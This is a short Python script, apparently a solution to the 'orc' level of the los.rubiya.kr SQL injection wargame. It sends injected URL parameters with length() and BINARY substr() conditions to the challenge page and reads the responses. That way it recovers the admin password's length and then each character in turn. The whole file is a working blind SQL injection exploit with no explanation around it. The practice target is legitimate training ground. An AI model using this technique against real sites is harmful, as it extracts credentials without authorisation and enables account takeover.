import requests

Cookies = {
    'PHPSESSID':'los.rubiya.kr in PHPSESSID Value'
}

for length in range(1,10):
    
    url = f'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=%27%20or%20id=%27admin%27%20and%20length(pw)={length}%23%27'

    r = requests.get(url = url,cookies = Cookies).text

    if r.find("<br><h2>Hello admin</h2>") > 0:
        print('los.rubiya.kr orc password length :',length)

string = ''
for i in range(1,9):
    for substr in range(48,123):
        url = f'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=%27%20or%20id=%27admin%27%20and%20BINARY%20substr(pw,{i},1)=%27{chr(substr)}%27%23%27'

        r = requests.get(url = url,cookies = Cookies).text

        if r.find("<br><h2>Hello admin</h2>") > 0:
            print(chr(substr),end='')
            string += chr(substr)
            break

print('los.rubiay.kr ord Problem password :',string)
